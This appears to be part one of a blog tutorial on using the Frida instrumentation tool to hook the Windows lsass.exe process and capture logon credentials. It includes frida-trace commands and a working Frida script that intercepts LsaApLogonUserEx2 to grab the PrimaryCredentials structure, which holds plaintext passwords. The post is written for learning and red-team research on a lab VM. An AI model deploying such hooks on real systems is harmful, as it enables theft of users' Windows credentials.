---
title: Dumping Lsass with... Frida? (Part 1)
description: A blog about dynamic instrumentation of Lsass for fun and profit!
---

# Dumping Lsass with... Frida? (Part 1)

Recently I've been getting into [Frida](https://frida.re/), a great debugging and dynamic instrumentation tool with cross-platform support. Before I looked into it, I'd only ever heard of Frida as a tool for hacking mobile apps - I'd never considered it for anything else. However, I think Frida has just as much potential as a rapid prototyping tool for reverse engineering and exploit development. It's agile, portable and fast, which makes it an excellent choice for experimenting and tinkering with a process.

I've had advice in the past that writing your own Mimikatz implementation is one of the best ways to get familiar working with memory hacking in Windows. A credential dumper that requires you to execute and connect to a Frida server on the target probably wouldn't be your first choice on an engagement. However, it's also not something I've seen anyone else doing, and I hoped that the end result would be a kind of "intermediary" tool that could be trivially ported to other languages. 

In this first part, we'll focus on taking advantage of Frida's dynamic instrumentation features to backdoor Lsass remotely. In future articles, we'll explore dumping credentials directly from Lsass memory.

## Step 1: Exploring Lsass

You can find a wealth of tools and tutorials out there which discuss how mimikatz works and how to dump credentials from the process memory of Lsass. I wanted to make a start completely blind, though, and see what I could discover with Frida alone.

To start with, I spun up a Windows 10 VM and launched the latest version of Frida server as Administrator:

```powershell
> .\frida-server.exe -l 0.0.0.0
```

This opens a debugging server on port 27042, which we can connect to using Frida:

```bash
$ frida -H 192.168.1.120 lsass.exe
```

One of Frida's most powerful features is its dynamic instrumentation functionality, which lets us hook almost any function used by a process. Before we can do that, though, we need some situational awareness. There are a lot of different modules loaded by the *lsass.exe* process, which we can enumerate using `Process.enumerateModules()`:

```text
    {
        "base": "0x7ffd1ca30000",
        "name": "msv1_0.DLL",
        "path": "C:\\Windows\\system32\\msv1_0.DLL",
        "size": 483328
    },
```

Out of the many possible options, this one stands out - it's the Microsoft Authentication Package, which is invoked by LSA when a user performs an interactive logon. According to [Microsoft's documentation](https://learn.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package):

> The MSV1_0 package checks the local security accounts manager (SAM) database to determine whether the logon data belongs to a valid security principal and then returns the result of the logon attempt to the LSA.

If we're looking to hook into the authentication logic called by Lsass, this seems like a pretty good place to start.

## Step 2: Hooking MSV1_0

So, now we have a good idea of a target, but how do we know which functions to hook in order to extract credentials? This is where frida-trace comes to the rescue. We can simply specify the module we're interested in and hook all functions within it:

```bash
frida-trace -H 192.168.1.120 lsass.exe -i 'msv1_0.DLL!*'
```

We leave this running while we invoke an interactive logon somewhere on the target VM (i.e. using the *runas* commad), and sure enough:

![a screenshot of various hooked functions including LsaApLogonUserEx2](/img/tracing-msv1_0.png)

I decided to go with the obvious choice here, and target the *LsaApLogonUserEx2()* function. Luckily for us, this function is actually [documented in the MSDN](https://docs.microsoft.com/en-us/windows/win32/api/ntsecpkg/nc-ntsecpkg-lsa_ap_logon_user_ex2). That will make hooking it a lot easier, as we know exactly what the arguments and expected return values are.

```text
LSA_AP_LOGON_USER_EX2 LsaApLogonUserEx2;

NTSTATUS LsaApLogonUserEx2(
  [in]  PLSA_CLIENT_REQUEST ClientRequest,
  [in]  SECURITY_LOGON_TYPE LogonType,
  [in]  PVOID ProtocolSubmitBuffer,
  [in]  PVOID ClientBufferBase,
  [in]  ULONG SubmitBufferSize,
  [out] PVOID *ProfileBuffer,
  [out] PULONG ProfileBufferSize,
  [out] PLUID LogonId,
  [out] PNTSTATUS SubStatus,
  [out] PLSA_TOKEN_INFORMATION_TYPE TokenInformationType,
  [out] PVOID *TokenInformation,
  [out] PUNICODE_STRING *AccountName,
  [out] PUNICODE_STRING *AuthenticatingAuthority,
  [out] PUNICODE_STRING *MachineName,
  [out] PSECPKG_PRIMARY_CRED PrimaryCredentials,
  [out] PSECPKG_SUPPLEMENTAL_CRED_ARRAY *SupplementalCredentials
)
```

Armed with this information, we can see that the thing we probably care about is the *PrimaryCredentials* variable, which is the 15th argument passed to the function. Now we know enough to write our own Frida script:

```text
var msv = Process.getModuleByName("msv1_0.DLL");
var logonUser = msv.getExportByName("LsaApLogonUserEx2");

Interceptor.attach(logonUser, {
	onEnter: function(args) {
		this.primaryCredentials = args[14];
	},
	onLeave: function(retval) {
		console.log("Address of primary credentials is " + this.primaryCredentials);
	}
});
```

So far, the script it pretty simple. We identify the address of the function and attach to it with Frida's interceptor. When the function is entered, we save the address of the PrimaryCredentials array. When the function exits, we print the address. To test it out, simply inject the script into Frida:

```bash
$ frida -H 192.168.1.120 lsass.exe -l LsaApLogonUserEx2.js
```

And invoke another interactive logon.

## Step 3: Parsing PrimaryCredentials

So, now we can hook the *LsaApLogonUserEx2()* function and get a pointer to the PrimaryCredentials structure. How do we turn that into actual credential information? The PrimaryCredentials structure is of type *PSECPKG_PRIMARY_CRED*, which means it's a pointer to a *SECPKG_PRIMARY_CRED* struct. Happily for us, that struct is [documented for us as well](https://docs.microsoft.com/en-us/windows/win32/api/ntsecpkg/ns-ntsecpkg-secpkg_primary_cred):

```text
typedef struct _SECPKG_PRIMARY_CRED {
  LUID           LogonId;
  UNICODE_STRING DownlevelName;
  UNICODE_STRING DomainName;
  UNICODE_STRING Password;
  UNICODE_STRING OldPassword;
  PSID           UserSid;
  ULONG          Flags;
  UNICODE_STRING DnsDomainName;
  UNICODE_STRING Upn;
  UNICODE_STRING LogonServer;
  UNICODE_STRING Spare1;
  UNICODE_STRING Spare2;
  UNICODE_STRING Spare3;
  UNICODE_STRING Spare4;
} SECPKG_PRIMARY_CRED, *PSECPKG_PRIMARY_CRED;
```

This gives us all the information we need to write our own parser in Frida.


<!--
Resources that helped me, which I should credit:

https://blog.xpnsec.com/exploring-mimikatz-part-1/
https://www.matteomalvica.com/blog/2020/01/20/mimikatz-lsass-dump-windg-pykd/
-->
